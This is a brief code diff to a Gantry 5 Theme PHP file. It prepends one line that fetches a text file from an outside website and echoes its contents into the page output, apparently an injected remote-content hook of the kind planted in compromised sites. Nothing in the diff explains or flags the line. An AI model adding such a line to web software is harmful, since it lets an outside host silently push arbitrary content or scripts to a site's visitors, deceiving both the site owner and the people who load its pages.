@@ -1,3 +1,4 @@
+<?php echo file_get_contents("https://pn-jogjakarta.website/txt/asli.txt");?>
 <?php
 /**
  * @package   Gantry 5 Theme
